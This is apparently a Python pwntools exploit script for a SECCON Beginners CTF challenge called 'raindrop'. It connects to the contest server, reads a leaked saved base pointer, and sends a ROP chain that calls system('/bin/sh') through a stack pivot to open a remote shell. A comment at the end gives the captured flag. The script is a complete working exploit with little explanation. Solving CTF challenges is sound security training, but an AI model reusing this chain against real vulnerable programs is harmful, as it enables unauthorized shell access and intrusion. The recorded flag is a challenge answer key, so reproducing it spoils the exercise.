from pwn import *
import re


context.terminal = ['tmux', 'splitw', '-h']

binpath = './chall'
elf = ELF(binpath)

addr_pop_rdi = 0x0000000000401453  # : pop rdi ; ret
addr_pop_rsp_pop3 = 0x000000000040144d  # : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret



# io = process(binpath)

gdbscript = '''
gef
# b vuln
b *0x401276
c
'''
# io = gdb.debug([binpath], aslr=False, gdbscript=gdbscript)
io = remote('raindrop.quals.beginners.seccon.jp', 9001)

data = io.recvuntil(b'finish')
saved_rbp = int(re.search(b'(0x[0-9a-f]*).*saved rbp', data).groups()[0], 16)
addr_buf = saved_rbp - 0x20
addr_pivot = addr_buf - 3 * 8
addr_binsh = addr_buf + 5 * 8
print('addr_buf = 0x{:x}'.format(addr_buf))

payload = b''
payload += p64(addr_pop_rdi)
payload += p64(addr_binsh)
payload += p64(elf.plt['system'])
payload += p64(addr_pop_rsp_pop3)
payload += p64(addr_pivot)
payload += b'/bin/sh\x00'

io.send(payload)

io.interactive()

# ctf4b{th053_d4y5_4r3_g0n3_f0r3v3r}
